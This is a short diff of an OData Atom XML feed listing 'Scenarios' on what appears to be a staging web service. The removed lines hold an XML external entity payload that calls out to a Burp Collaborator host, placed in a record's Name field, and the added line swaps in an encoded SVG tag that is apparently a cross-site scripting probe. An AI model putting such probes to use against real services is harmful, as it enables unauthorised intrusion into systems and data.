@@ -1,5 +1,4 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<!DOCTYPE test [ <!ENTITY init SYSTEM "http://gxhml94sprec69m7dbkwltc61x7tvi.burpcollaborator.net/"> ]>
 <feed xml:base="http://javelin.staging.zsservices.com/Integration/0002a/wcf/v5.svc/" xmlns:d="http://schemas.microsoft.com/ado/2007/08/dataservices" xmlns:m="http://schemas.microsoft.com/ado/2007/08/dataservices/metadata" xmlns="http://www.w3.org/2005/Atom">
   <title type="text">Scenarios</title>
   <id>http://javelin.staging.zsservices.com/Integration/0002a/wcf/V5.svc/Scenarios</id>
@@ -17,7 +16,7 @@
     <content type="application/xml">
       <m:properties>
         <d:Id>51ebc30c-770f-4b2e-aca5-471d1a803f83</d:Id>
-        <d:Name>21 augga&init;</d:Name>
+        <d:Name>21 auggg%u003csvg%u003e</d:Name>
         <d:DataPeriod>8/1/2019</d:DataPeriod>
       </m:properties>
     </content>
